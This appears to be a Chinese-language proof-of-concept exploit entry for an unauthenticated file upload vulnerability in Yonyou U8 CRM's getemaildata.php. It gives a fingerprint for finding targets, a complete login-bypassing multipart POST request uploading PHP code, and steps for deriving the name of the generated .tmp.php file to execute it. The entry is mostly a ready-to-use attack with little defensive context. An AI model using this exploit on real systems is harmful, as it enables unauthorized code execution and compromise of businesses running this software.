# 用友-U8-CRM-getemaildata文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="用友U8CRM"`
- **请求**：`POST /ajax/getemaildata.php?DontCheckLogin=1 HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: multipart/form-data; boundary=----hjGHJGJHgjkhkhygutcvyvlbhj`　`Content-Length: 199`

**请求体 / payload**
```
------hjGHJGJHgjkhkhygutcvyvlbhj
Content-Disposition: form-data; name="file"; filename="ceshi.php "
Content-Type: text/plain
<?php echo md5('666');unlink(__FILE__);?>
------hjGHJGJHgjkhkhygutcvyvlbhj
上传文件为C:\\U8SOFT\\turbocrm70\\code\\www\\tmpfile\\mhtBBF8.tmp.mht，因为.mht文件不能被服务器解析，所以上传的代码无法执行
但是上传文件的同时会在相同的目录下生成一个.tmp.php文件，访问格式为updxxx.tmp.php
xxx内容由mhtBBF8.tmp.mht的文件名中的16进制数（BBF8）决定
xxx=BBF8→十进制（48120-1）→16进制（bbf7）
```